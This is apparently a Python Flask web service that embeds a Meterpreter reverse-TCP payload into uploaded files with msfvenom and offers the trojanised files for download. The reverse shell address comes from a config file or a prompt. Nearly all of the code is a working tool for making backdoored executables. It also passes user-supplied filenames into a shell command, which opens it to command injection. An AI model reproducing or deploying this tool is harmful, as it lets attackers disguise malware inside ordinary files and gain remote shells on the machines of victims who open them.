import os
import subprocess
from flask import Flask, request, redirect, url_for, render_template, send_from_directory

app = Flask(__name__)

UPLOAD_FOLDER = 'upload'
INFECTED_FOLDER = 'infected'
CONFIG_FILE = 'config.fkn'

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['INFECTED_FOLDER'] = INFECTED_FOLDER
app.config['MAX_CONTENT_PATH'] = 16 * 1024 * 1024  # Maksimum dosya boyutu 16 MB

# Creating the necessary folders
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

if not os.path.exists(INFECTED_FOLDER):
    os.makedirs(INFECTED_FOLDER)

# Get reverse shell information
def get_reverse_shell():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            return file.read().strip()
    else:
        return input("Enter the reverse shell connection address (e.g. 192.168.1.100:4444): ")

# File infection process
def infect_file(file_path):
    reverse_shell = get_reverse_shell()
    filename = os.path.basename(file_path)
    output_file = os.path.join(INFECTED_FOLDER, f"infected_{filename}")
    
    # Infect the file with the msfvenom command
    command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={reverse_shell.split(':')[0]} LPORT={reverse_shell.split(':')[1]} -x {file_path} -o {output_file}"
    print(f"{filename} file is infected...")
    subprocess.run(command, shell=True)
    print(f"Infected file: {output_file}")
    
    return output_file

# Home page (file upload form)
@app.route('/')
def upload_form():
    infected_files = os.listdir(INFECTED_FOLDER)
    return render_template('upload.html', infected_files=infected_files)

# File upload process
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'files[]' not in request.files:
        return redirect(request.url)

    files = request.files.getlist('files[]')

    for file in files:
        if file.filename != '':
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)
            file.save(file_path)
            # The file is infected
            infect_file(file_path)

    return redirect(url_for('upload_form'))

# Listing and downloading infected files
@app.route('/infected/<filename>')
def download_infected_file(filename):
    return send_from_directory(app.config['INFECTED_FOLDER'], filename)

# Deleting infected files
@app.route('/delete/<filename>', methods=['POST'])
def delete_file(filename):
    file_path = os.path.join(app.config['INFECTED_FOLDER'], filename)
    if os.path.exists(file_path):
        os.remove(file_path)
    return redirect(url_for('upload_form'))

if __name__ == '__main__':
    app.run(debug=True)
